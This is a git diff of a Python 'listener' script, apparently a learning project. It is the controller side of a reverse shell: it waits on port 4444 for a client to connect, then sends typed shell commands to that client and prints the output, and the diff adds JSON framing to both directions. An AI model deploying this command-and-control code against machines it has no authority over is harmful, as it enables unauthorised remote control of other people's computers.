@@ -1,8 +1,9 @@
 #!/usr/bin/python
-# General - Connection to the client, able to send and recieve data. Testing on port 4444
+# General - Connection to the client, able to send and recieve data. Testing on port 4444.
+# General - json is used to manage serilisation to receive large data.
 
 
-import socket
+import socket, json
 
 
 class Listr:
@@ -13,21 +14,37 @@ class Listr:
         print(addr)
         listr.bind((addr, prt))
         listr.listen(0)
-        print("\n[+] Waiting for incoming connection.\n")
+        print("\n[+] Waiting for incoming connection.\n") #testing
         self.conn, addrs = listr.accept()
-        print("[+] Got a connection from " + str(addrs) + "\n")
+        print("[+] Got a connection from " + str(addrs) + "\n") #testing
+
+    def send_data(self, data):
+        print("\ntype: " + str(type(data)) + " - data: " + data + "\n") #testing
+        json_data = json.dumps(data)
+        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
+        self.conn.send(json_data.encode())
+
+    def rcve_data(self):
+        json_data = ""
+        while True:
+            try:
+                json_data += self.conn.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
     def exe_rmy(self, comm):
-        self.conn.send(comm.encode())
-        return self.conn.recv(1024)
+        self.send_data(comm)
+        return self.rcve_data()
 
     def run(self):
         while True:
             comm = input('=[ $ ')
+            print(self.exe_rmy(comm))
             if "exit" in comm:
+                self.conn.close()
                 break
-            print(self.exe_rmy(comm).decode('ascii'))
-        self.conn.close()
+        
 
 my_listner = Listr('', 4444)
 my_listner.run()
